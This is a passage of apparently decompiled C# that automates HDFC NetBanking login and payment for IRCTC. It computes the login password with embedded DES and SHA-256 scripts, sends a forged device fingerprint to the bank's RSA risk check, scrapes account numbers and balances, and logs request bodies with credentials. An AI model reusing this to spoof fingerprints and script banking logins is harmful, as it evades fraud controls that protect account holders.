(0,0x400,0x20,0x420,0,0x400,0x20,0x420,0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420);\n\tpc2bytes6 = new Array (0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002);\n\tpc2bytes7 = new Array (0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800);\n\tpc2bytes8 = new Array (0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002);\n\tpc2bytes9 = new Array (0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408);\n\tpc2bytes10 = new Array (0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020);\n\tpc2bytes11 = new Array (0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200);\n\tpc2bytes12 = new Array (0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010);\n\tpc2bytes13 = new Array (0,0x4,0x100,0x104,0,0x4,0x100,0x104,0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105);\n\t//how many iterations (1 for des, 3 for triple des)\n\tvar iterations = key.length > 8 ? 3 : 1; //changed by Paul 16/6/2007 to use Triple DES for 9+ byte keys\n\t//stores the return keys\n\tvar keys = new Array (32 * iterations);\n\t//now define the left shifts which need to be done\n\tvar shifts = new Array (0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0);\n\t//other variables\n\tvar lefttemp, righttemp, m=0, n=0, temp;\n\tfor (var j=0; j<iterations; j++) { //either 1 or 3 iterations\n\tleft = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\tright = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 2) ^ right) & 0x33333333; right ^= temp; left ^= (temp << 2);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\t//the right side needs to be shifted and to get the last four bits of the left side\n\ttemp = (left << 8) | ((right >>> 20) & 0x000000f0);\n\t//left needs to be put upside down\n\tleft = (right << 24) | ((right << 8) & 0xff0000) | ((right >>> 8) & 0xff00) | ((right >>> 24) & 0xf0);\n\tright = temp;\n\t//now go through and perform these shifts on the left and right keys\n\tfor (var i=0; i < shifts.length; i++) {\n\t//shift the keys either one or two bits to the left\n\tif (shifts[i]) {left = (left << 2) | (left >>> 26); right = (right << 2) | (right >>> 26);}\n\telse {left = (left << 1) | (left >>> 27); right = (right << 1) | (right >>> 27);}\n\tleft &= -0xf; right &= -0xf;\n\t//now apply PC-2, in such a way that E is easier when encrypting or decrypting\n\t//this conversion will look like PC-2 except only the last 6 bits of each byte are used\n\t//rather than 48 consecutive bits and the order of lines will be according to\n\t//how the S selection functions will be applied: S2, S4, S6, S8, S1, S3, S5, S7\n\tlefttemp = pc2bytes0[left >>> 28] | pc2bytes1[(left >>> 24) & 0xf]\n\t| pc2bytes2[(left >>> 20) & 0xf] | pc2bytes3[(left >>> 16) & 0xf]\n\t| pc2bytes4[(left >>> 12) & 0xf] | pc2bytes5[(left >>> 8) & 0xf]\n\t| pc2bytes6[(left >>> 4) & 0xf];\n\trighttemp = pc2bytes7[right >>> 28] | pc2bytes8[(right >>> 24) & 0xf]\n\t| pc2bytes9[(right >>> 20) & 0xf] | pc2bytes10[(right >>> 16) & 0xf]\n\t| pc2bytes11[(right >>> 12) & 0xf] | pc2bytes12[(right >>> 8) & 0xf]\n\t| pc2bytes13[(right >>> 4) & 0xf];\n\ttemp = ((righttemp >>> 16) ^ lefttemp) & 0x0000ffff;\n\tkeys[n++] = lefttemp ^ temp; keys[n++] = righttemp ^ (temp << 16);\n\t}\n\t} //for each iterations\n\t//return the keys we've created\n\treturn keys;\n\t} //end of des_createKeys\n\t////////////////////////////// TEST //////////////////////////////\n\tfunction stringToHex (s) {\n\tvar r = \"0x\";\n\tvar hexes = new Array (\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\n\tfor (var i=0; i<s.length; i++) {r += hexes [s.charCodeAt(i) >> 4] + hexes [s.charCodeAt(i) & 0xf];}\n\treturn r;\n\t}\n\tfunction hexToString (h) {\n\tvar r = \"\";\n\tfor (var i= (h.substr(0, 2)==\"0x\")?2:0; i<h.length; i+=2) {r += String.fromCharCode (parseInt (h.substr (i, 2), 16));}\n\treturn r;\n\t}\n\t//-----------------------------------------------------------------------------------------------------\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
                        WebBrowser webBrowser = new WebBrowser();
                        webBrowser.Navigate("about:blank");
                        webBrowser.Document.Write(text17);
                        string text18 = webBrowser.Document.InvokeScript("des", new object[4]
                        {
                            text2.Substring(0, 8),
                            text2,
                            1,
                            0
                        }).ToString();
                        string text19 = webBrowser.Document.InvokeScript("stringToHex", new object[1] { text18 }).ToString();
                        text19 = text19.ToUpper().Substring(2);
                        while (text19.Length < 32)
                        {
                            text19 += "0";
                        }
                        webBrowser.Dispose();
                        string text20 = "<html>\n<head>\n<script type=\"text/javascript\">\n/*\n\t* jssha256 version 0.1 - Copyright 2006 B. Poettering\n\t*\n\t* This program is free software; you can redistribute it and/or\n\t* modify it under the terms of the GNU General Public License as\n\t* published by the Free Software Foundation; either version 2 of the\n\t* License, or (at your option) any later version.\n\t*\n\t* This program is distributed in the hope that it will be useful,\n\t* but WITHOUT ANY WARRANTY; without even the implied warranty of\n\t* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n\t* General Public License for more details.\n\t*\n\t* You should have received a copy of the GNU General Public License\n\t* along with this program; if not, write to the Free Software\n\t* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA\n\t* 02111-1307 USA\n\t*/\n\t/*\n\t* http://point-at-infinity.org/jssha256/\n\t*\n\t\n\t* This is a JavaScript implementation of the SHA256 secure hash function\n\t* and the HMAC-SHA256 message authentication code (MAC).\n\t*\n\t* The routines' well-functioning has been verified with the test vectors\n\t* given in FIPS-180-2, Appendix B and IETF RFC 4231. The HMAC algorithm\n\t* conforms to IETF RFC 2104.\n\t*\n\t* The following code example computes the hash value of the string \"abc\".\n\t*\n\t* SHA256_init();\n\t* SHA256_write(\"abc\");\n\t* digest = SHA256_finalize();\n\t* digest_hex = array_to_hex_string(digest);\n\t*\n\t* Get the same result by calling the shortcut function SHA256_hash:\n\t*\n\t* digest_hex = SHA256_hash(\"abc\");\n\t*\n\t* In the following example the calculation of the HMAC of the string \"abc\"\n\t* using the key \"secret key\" is shown:\n\t*\n\t* HMAC_SHA256_init(\"secret key\");\n\t* HMAC_SHA256_write(\"abc\");\n\t* mac = HMAC_SHA256_finalize();\n\t* mac_hex = array_to_hex_string(mac);\n\t*\n\t* Again, the same can be done more conveniently:\n\t*\n\t* mac_hex = HMAC_SHA256_MAC(\"secret key\", \"abc\");\n\t*\n\t* Note that the internal state of the hash function is held in global\n\t* variables. Therefore one hash value calculation has to be completed\n\t* before the next is begun. The same applies the the HMAC routines.\n\t*\n\t* Report bugs to: jssha256 AT point-at-infinity.org\n\t*\n\t*/\n\t/******************************************************************************/\n\t/* Two all purpose helper functions follow */\n\t/* string_to_array: convert a string to a character (byte) array */\n\tfunction string_to_array(str) {\n\tvar len = str.length;\n\tvar res = new Array(len);\n\tfor(var i = 0; i < len; i++)\n\tres[i] = str.charCodeAt(i);\n\treturn res;\n\t}\n\t/* array_to_hex_string: convert a byte array to a hexadecimal string */\n\tfunction array_to_hex_string(ary) {\n\tvar res = \"\";\n\tfor(var i = 0; i < ary.length; i++)\n\tres += SHA256_hexchars[ary[i] >> 4] + SHA256_hexchars[ary[i] & 0x0f];\n\treturn res;\n\t}\n\t/******************************************************************************/\n\t/* The following are the SHA256 routines */\n\t/*\n\tSHA256_init: initialize the internal state of the hash function. Call this\n\tfunction before calling the SHA256_write function.\n\t*/\n\t\n\tfunction SHA256_init() {\n\tSHA256_H = new Array(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,\n\t0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19);\n\tSHA256_buf = new Array();\n\tSHA256_len = 0;\n\t}\n\t/*\n\tSHA256_write: add a message fragment to the hash function's internal state.\n\t'msg' may be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction SHA256_write(msg) {\n\tif (typeof(msg) == \"string\")\n\tSHA256_buf = SHA256_buf.concat(string_to_array(msg));\n\telse\n\tSHA256_buf = SHA256_buf.concat(msg);\n\tfor(var i = 0; i + 64 <= SHA256_buf.length; i += 64)\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf.slice(i, i + 64));\n\tSHA256_buf = SHA256_buf.slice(i);\n\tSHA256_len += msg.length;\n\t}\n\t/*\n\tSHA256_finalize: finalize the hash value calculation. Call this function\n\tafter the last call to SHA256_write. An array of 32 bytes (= 256 bits)\n\tis returned.\n\t*/\n\tfunction SHA256_finalize() {\n\tSHA256_buf[SHA256_buf.length] = 0x80;\n\tif (SHA256_buf.length > 64 - 8) {\n\tfor(var i = SHA256_buf.length; i < 64; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tSHA256_buf.length = 0;\n\t}\n\tfor(var i = SHA256_buf.length; i < 64 - 5; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_buf[59] = (SHA256_len >>> 29) & 0xff;\n\tSHA256_buf[60] = (SHA256_len >>> 21) & 0xff;\n\tSHA256_buf[61] = (SHA256_len >>> 13) & 0xff;\n\tSHA256_buf[62] = (SHA256_len >>> 5) & 0xff;\n\tSHA256_buf[63] = (SHA256_len << 3) & 0xff;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tvar res = new Array(32);\n\tfor(var i = 0; i < 8; i++) {\n\tres[4 * i + 0] = SHA256_H[i] >>> 24;\n\tres[4 * i + 1] = (SHA256_H[i] >> 16) & 0xff;\n\tres[4 * i + 2] = (SHA256_H[i] >> 8) & 0xff;\n\tres[4 * i + 3] = SHA256_H[i] & 0xff;\n\t}\n\tdelete SHA256_H;\n\tdelete SHA256_buf;\n\tdelete SHA256_len;\n\treturn res;\n\t}\n\t/*\n\tSHA256_hash: calculate the hash value of the string or byte array 'msg'\n\tand return it as hexadecimal string. This shortcut function may be more\n\tconvenient than calling SHA256_init, SHA256_write, SHA256_finalize\n\tand array_to_hex_string explicitly.\n\t*/\n\tfunction SHA256_hash(msg) {\n\tvar res;\n\tSHA256_init();\n\tSHA256_write(msg);\n\tres = SHA256_finalize();\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following are the HMAC-SHA256 routines */\n\t/*\n\tHMAC_SHA256_init: initialize the MAC's internal state. The MAC key 'key'\n\tmay be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_init(key) {\n\tif (typeof(key) == \"string\")\n\tHMAC_SHA256_key = string_to_array(key);\n\telse\n\tHMAC_SHA256_key = new Array().concat(key);\n\tif (HMAC_SHA256_key.length > 64) {\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tHMAC_SHA256_key = SHA256_finalize();\n\t}\n\tfor(var i = HMAC_SHA256_key.length; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\t}\n\t/*\n\tHMAC_SHA256_write: process a message fragment. 'msg' may be given as\n\tstring or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_write(msg) {\n\tSHA256_write(msg);\n\t}\n\t/*\n\tHMAC_SHA256_finalize: finalize the HMAC calculation. An array of 32 bytes\n\t(= 256 bits) is returned.\n\t*/\n\tfunction HMAC_SHA256_finalize() {\n\tvar md = SHA256_finalize();\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36 ^ 0x5c;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tSHA256_write(md);\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tdelete HMAC_SHA256_key;\n\treturn SHA256_finalize();\n\t}\n\t/*\n\tHMAC_SHA256_MAC: calculate the HMAC value of message 'msg' under key 'key'\n\t(both may be of type string or byte array); return the MAC as hexadecimal\n\tstring. This shortcut function may be more convenient than calling\n\tHMAC_SHA256_init, HMAC_SHA256_write, HMAC_SHA256_finalize and\n\tarray_to_hex_string explicitly.\n\t*/\n\tfunction HMAC_SHA256_MAC(key, msg) {\n\tvar res;\n\tHMAC_SHA256_init(key);\n\tHMAC_SHA256_write(msg);\n\tres = HMAC_SHA256_finalize()\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following lookup tables and functions are for internal use only! */\n\tSHA256_hexchars = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n\t'a', 'b', 'c', 'd', 'e', 'f');\n\tSHA256_K = new Array(\n\t0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,\n\t0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,\n\t0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,\n\t0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n\t0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,\n\t0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,\n\t0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,\n\t0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n\t0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,\n\t0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,\n\t0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n\t);\n\tfunction SHA256_sigma0(x) {\n\treturn ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);\n\t}\n\tfunction SHA256_sigma1(x) {\n\treturn ((x >>> 17) | (x << 15)) ^ ((x >>> 19) | (x << 13)) ^ (x >>> 10);\n\t}\n\tfunction SHA256_Sigma0(x) {\n\t\n\treturn ((x >>> 2) | (x << 30)) ^ ((x >>> 13) | (x << 19)) ^\n\t((x >>> 22) | (x << 10));\n\t}\n\tfunction SHA256_Sigma1(x) {\n\treturn ((x >>> 6) | (x << 26)) ^ ((x >>> 11) | (x << 21)) ^\n\t((x >>> 25) | (x << 7));\n\t}\n\tfunction SHA256_Ch(x, y, z) {\n\treturn z ^ (x & (y ^ z));\n\t}\n\tfunction SHA256_Maj(x, y, z) {\n\treturn (x & y) ^ (z & (x ^ y));\n\t}\n\tfunction SHA256_Hash_Word_Block(H, W) {\n\tfor(var i = 16; i < 64; i++)\n\tW[i] = (SHA256_sigma1(W[i - 2]) + W[i - 7] +\n\tSHA256_sigma0(W[i - 15]) + W[i - 16]) & 0xffffffff;\n\tvar state = new Array().concat(H);\n\tfor(var i = 0; i < 64; i++) {\n\tvar T1 = state[7] + SHA256_Sigma1(state[4]) +\n\tSHA256_Ch(state[4], state[5], state[6]) + SHA256_K[i] + W[i];\n\tvar T2 = SHA256_Sigma0(state[0]) + SHA256_Maj(state[0], state[1], state[2]);\n\tstate.pop();\n\tstate.unshift((T1 + T2) & 0xffffffff);\n\tstate[4] = (state[4] + T1) & 0xffffffff;\n\t}\n\tfor(var i = 0; i < 8; i++)\n\tH[i] = (H[i] + state[i]) & 0xffffffff;\n\t}\n\t\n\tfunction SHA256_Hash_Byte_Block(H, w) {\n\tvar W = new Array(16);\n\tfor(var i = 0; i < 16; i++)\n\tW[i] = w[4 * i + 0] << 24 | w[4 * i + 1] << 16 |\n\tw[4 * i + 2] << 8 | w[4 * i + 3];\n\tSHA256_Hash_Word_Block(H, W);\n\t}\n\t/*\n\tPreparing a genric function to be used for generating HMAC_SHA256_MAC.\n\t*/\n\tfunction hex_hmac(key, data)\n\t{\n\treturn HMAC_SHA256_MAC(key, data);\n\t}\n\t\n</script>\n\n<script>\n\nfunction random()\n\t{\n\tvar Pass= Math.floor(10000000 + (Math.random() * (100000000 - 10000000 + 1))); \n\treturn Pass;\n\n}\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
                        WebBrowser webBrowser2 = new WebBrowser();
                        webBrowser2.Navigate("about:blank");
                        webBrowser2.Document.Write(text20);
                        string_95 = Conversions.ToString(webBrowser2.Document.InvokeScript("random"));
                        text16 = webBrowser2.Document.InvokeScript("hex_hmac", new object[2] { string_95, text19 }).ToString();
                        webBrowser2.Dispose();
                        string str4 = "version=2&pm_fpua=Godzila/5.0 (windows nt 6.1) applewebkit/537.36 (khtml, like gecko) chrome/44.0.2403.157 safari/537.36|5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36|Win32&pm_fpsc=24|1600|900|856&pm_fpsw=&pm_fptz=5.5&pm_fpln=lang=en-US|syslang=|userlang=&pm_fpjv=1&pm_fpco=1&pm_fpasw=widevinecdmadapter|mhjfbmdgcfjbbpaeojofohoefgiehjai|pepflashplayer|internal-remoting-viewer|internal-nacl-plugin|internal-pdf-viewer&pm_fpan=Netscape&pm_fpacn=Mozilla&pm_fpol=true&pm_fposp=&pm_fpup=&pm_fpsaw=1600&pm_fpspd=24&pm_fpsbd=&pm_fpsdx=&pm_fpsdy=&pm_fpslx=&pm_fpsly=&pm_fpsfse=&pm_fpsui=";
                        string text21 = text + "-" + string_95 + "-MERCHANT-E-";
                        text6 = "fldpwdtmp=&fldAppId=XT&fldDevicePrint=" + HttpUtility.UrlEncode(str4) + "&fldTxnId=LGN&fldScrnSeqNbr=11&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldRandomNumber=" + string_95 + "&fldRefPage=rsloginhtml&fldRefVal=" + text21 + "&fldRsaAuthReq=E&fldClientCode=Client1&fldMerchCode=IRCTC_CRIS&fldClientAccNum=&fldAccReqFlag=N&fldMerchRefNbr=" + text10 + "&fldSucStatFlg=N&fldFailStatFlg=N&fldDatTimeTxn=" + HttpUtility.UrlEncode(text11) + "&fldTxnCurr=INR&fldTxnAmt=" + text12 + "&fldTxnScAmt=" + text13 + "&fldRef1=&fldRef2=&fldRef3=&fldRef4=&fldRef5=&fldRef6=&fldRef7=&fldRef8=&fldRef9=&fldRef10=&fldRef11=&fldDate1=&fldDate2=&fldCheckSum=" + text14 + "&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldDisplayDetails=&fldDetails1=&fldDetails2=&fldDetails3=&fldEpiToken=" + HttpUtility.UrlEncode(str3) + "&fldEpiReqId=" + text8 + "&OrgReqDate=" + HttpUtility.UrlEncode(str) + "&fldLoginUserId=" + text + "&fldPassword=" + text16;
                        string_91 = "https://netbanking.hdfcbank.com/netbanking/RSLogin.html?v=4";
                        string_92 = "https://netbanking.hdfcbank.com/netbanking/entry";
                        clsMain.Lock("Second Hit : Inp = " + text6);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(2/7)", tCntrlName_, null, null);
                        }
                        if (_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Output = " + string_94);
                            if (!string_94.Contains("<h1>Electronic Payment Facility</h1>"))
                            {
                                if (string_94.Contains("errormessage='"))
                                {
                                    startIndex = string_94.IndexOf("errormessage='");
                                    startIndex = string_94.IndexOf("'", startIndex) + 1;
                                    length = string_94.IndexOf("'", startIndex) - startIndex;
                                    string_90 = string_94.Substring(startIndex, length).Trim();
                                    if (string_90.Contains("16001"))
                                    {
                                        string_90 = "You are not registered for NetBanking.";
                                    }
                                    if (string_90.IndexOf("last session was terminated incorrectly", StringComparison.CurrentCultureIgnoreCase) >= 0 && num2 < 7)
                                    {
                                        if (string.IsNullOrEmpty(string_90) && string_94.Contains("frmResetPassword"))
                                        {
                                            string_90 = "HDFC: Please Reset your Login Password";
                                        }
                                        if (string.IsNullOrEmpty(string_90))
                                        {
                                            string_90 = "Failed while Login into HDFC";
                                        }
                                        clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                                        return false;
                                    }
                                }
                                clsMain.Lock("Third Hit Failed. err = " + string_93);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                return false;
                            }
                            text4 = clsPostData.smethod_7("", string_94, "input", "fldSessionId");
                            text5 = clsPostData.smethod_7("", string_94, "input", "fldRequestId");
                            if (!string_94.Contains("You have requested for an electronic payment"))
                            {
                                string_90 = "Failed while Processing into HDFC after Login";
                                clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                            }
                            else
                            {
                                startIndex = string_94.IndexOf("name=\"fldSessionId");
                                startIndex = string_94.LastIndexOf("<", startIndex);
                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text22 = string_94.Substring(startIndex, length).Trim();
                                startIndex = string_94.IndexOf("name=\"fldRequestId", startIndex);
                                startIndex = string_94.LastIndexOf("<", startIndex);
                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text23 = string_94.Substring(startIndex, length).Trim();
                                startIndex = string_94.IndexOf("name=\"fldCodOrgBrn", startIndex);
                                startIndex = string_94.LastIndexOf("<", startIndex);
                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text24 = string_94.Substring(startIndex, length).Trim();
                                startIndex = string_94.IndexOf("accounts") + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string str5 = string_94.Substring(startIndex, length);
                                startIndex = string_94.IndexOf("balance", startIndex) + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text25 = string_94.Substring(startIndex, length).Trim();
                                startIndex = string_94.IndexOf("branch", startIndex) + 5;
                                startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                string text26 = string_94.Substring(startIndex, length).Trim();
                                startIndex = string_94.IndexOf("mercName", startIndex) + 5;
                                startIndex = string_94.IndexOf("'", startIndex) + 1;
                                length = string_94.IndexOf("'", startIndex) - startIndex;
                                string text27 = string_94.Substring(startIndex, length).Trim();
                                text6 = "fldAppId=XT&fldTxnId=EOV&fldScrnSeqNbr=02&fldSessionId=" + text22 + "&fldRequestId=" + text23 + "&fldOrginalTxnId=XFT&fldOrginalScrnSeqNbr=42&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldCodOrgBrn=" + text24 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldBalList=" + text25 + "%7E%3A%3A%7E&fldBrnList=" + HttpUtility.UrlEncode(text26) + "%7E%3A%3A%7E&fldCcyList=INR%7E%3A%3A%7E&urlChallanDtl=&fldClientCode=" + text9 + "&fldMerchCode=" + text7 + "&fldMerchRefNo=" + text10 + "&fldMerchName=IRCTC_NEW&fldTxnCurr=INR&fldTxnAmt=" + text12 + "&fldTxnScAmt=" + text13 + "&fldBrnName=" + HttpUtility.UrlEncode(text26) + "&fldRsaTxnType=&fldRsaAuthReq=N&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldAdditionalFields=&fldDevicePrint=" + HttpUtility.UrlEncode(str4);
                                clsMain.Lock("Fifth Hit : Inp = " + text6);
                                if (updateTStatus_1 != null)
                                {
                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(3/7)", tCntrlName_, null, null);
                                }
                                if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                {
                                    clsMain.Lock("Fifth Hit Failed. err = " + string_93);
                                    string_90 = "Failed while making Payment. Payment Not Done";
                                }
                                else
                                {
                                    clsMain.Lock("Fifth Hit Output = " + string_94);
                                    text6 = class3_0.Method_SerialInp(string_94, ref string_92, false);
                                    text6 = clsPostData.SetPost(text6, "fldEnstageAuthAction", "ENSTAGE_OTPRELAY");
                                    text6 = clsPostData.SetPost(text6, "enstageid", "ENSTAGE_OTPRELAY");
                                    clsMain.Lock("Fifth Hit : Inp = " + text6);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(4/7)", tCntrlName_, null, null);
                                    }
                                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                    {
                                        clsMain.Lock("Fifth Hit Failed. err = " + string_93);
                                        string_90 = "Failed while making Payment. Payment Not Done";
                                    }
                                    else
                                    {
                                        clsMain.Lock("Fifth Hit Output = " + string_94);
                                        startIndex = string_94.IndexOf("name=\"fldRequestId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text23 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldExtSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text28 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRemoteAddress");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text29 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("l_rsaTxnId");
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text30 = string_94.Substring(startIndex, length).Trim();
                                        text6 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text22 + "&fldRequestId=" + text23 + "&fldMsgSentMode=M&fldMobile=on&fldExtSessionId=" + text28 + "&fldBrnName=" + HttpUtility.UrlEncode(text26) + "&fldDevicePrint=" + HttpUtility.UrlEncode(str4) + "&urlChallanDtl=&fldBrnList=" + HttpUtility.UrlEncode(text26) + "%7E%3A%3A%7E&fldCodOrgBrn=&fldAccountMapFlag=N&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldLoginUserGroupType=N&fldIdChannel=1&fldCcyList=INR%7E%3A%3A%7E&fldMerchCode=" + text7 + "&fldTxnAmt=" + text12 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldTxnLimitFlag=N&fldTxnCurr=INR&fldRemoteAddress=" + text29 + "&fldLoginUserGroupBaseType=E&fldMerchName=" + text27 + "&fldClientCode=" + text9 + "&fldAdditionalFields=&fldMerchRefNo=" + text10 + "&fldRsaAuthReq=Y&fldProxyUserFlag=N&fldTxnScAmt=" + text13 + "&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldRsaTxnType=&fldBalList=" + text25 + "%7E%3A%3A%7E&fldPinRequired=Y&fldPin=Y&fldPinSequence=1&fldRsaAuthRetry=&fldRsaAuthTxnId=" + text30 + 